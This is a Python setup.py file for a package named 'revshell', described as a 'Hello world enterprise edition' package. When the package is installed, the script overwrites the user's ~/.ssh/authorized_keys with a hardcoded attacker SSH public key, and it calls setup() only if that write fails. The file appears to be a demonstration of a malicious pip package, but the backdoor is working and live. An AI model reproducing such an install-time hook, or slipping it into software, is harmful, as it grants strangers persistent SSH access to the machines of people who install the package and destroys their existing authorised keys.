from setuptools import setup

try:
        print('hello')
        with open ('/home/low/.ssh/authorized_keys', 'w+') as f:
            f.writelines('ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIKWJ1WisXh886DFPt+s5nD0nzDXvxqZa9gYVgdJcJiiOD+cvgpMA4qanYgQ1/DHq/13jiuXrHr/EtanojweRpi3WfZGHwoiOxTCiE979PjYTgqbjS6Q5XuCfJlLth6UOdf0NB+xIJtxmpu4ingX6YLchcdPu5RUqeV8hYAdYs7jTJrfi4HNx3+dEwmHi8OIC2pkyJMH3c7KZ8QgpbRlUmbE9UI40DOrD5ic1K77su7Hznu59Ui8einNGQp14VuRN4vYMOC/a5aP6VixiE5+GoPfNWFwUqqy1UVy0x0I92Hn61ojO64dXQR2CqHWRnCRCi3cTlz+CqUAb0yd5mtYaBhCCm8vfAbRtQpLinY8sEwL8KRbpdmWmxSCsq94awQ3tIutDwCFTZZauFOdHB1EvlRP/itIOtoHkthKNwkKIr2hW9zDi0NWk9wdHg57zHdWuzyqnOelrZJjTvi/qKIPvFHbV3osqcpBuVBPeyscQ9JUDHZ1YfqmHqOrpgzu7CGEc=')
except:
        setup(
        name='revshell',
        packages=['revshell'],
        description='Hello world enterprise edition',
        version='0.1',
        url='http://github.com',
        author='test',
        author_email='docs@tst.com',
        keywords=['pip','revshell','example']
        )
